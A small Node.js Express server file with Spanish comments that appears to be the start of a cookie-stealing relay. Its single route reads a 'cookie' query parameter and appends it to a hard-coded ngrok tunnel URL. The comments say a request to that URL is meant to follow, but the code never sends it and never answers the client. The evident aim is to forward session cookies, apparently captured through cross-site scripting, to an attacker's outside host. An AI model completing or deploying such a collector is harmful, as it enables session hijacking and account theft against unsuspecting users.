const express = require('express');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    const ngrokURL = 'https://7413-90-173-214-195.ngrok-free.app/?cookie=' + req.query.cookie; // Se espera recibir la cookie como parámetro en la URL
    // Realizar la solicitud a ngrok
    // Puedes utilizar módulos como 'axios' o 'node-fetch' para realizar la solicitud a ngrok
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
